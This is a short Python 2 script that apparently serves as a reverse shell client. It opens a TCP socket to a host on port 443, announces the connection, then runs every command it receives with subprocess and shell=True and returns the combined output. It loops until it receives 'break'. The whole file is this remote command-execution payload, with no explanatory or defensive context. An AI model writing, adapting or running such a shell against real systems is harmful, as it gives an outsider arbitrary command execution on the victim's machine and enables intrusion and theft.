import socket, subprocess
HOST = socket.gethostbyname(socket.gethostname())
PORT = 443
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((HOST, PORT))

s.send('[*] Connected!!!')

while 1:

     data = s.recv(1024)

     if data == "break":
         break;

     proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

     stdout_value = proc.stdout.read() + proc.stderr.read()

     s.send(stdout_value)
# close socket
s.send("[*] Bye...")
s.close()
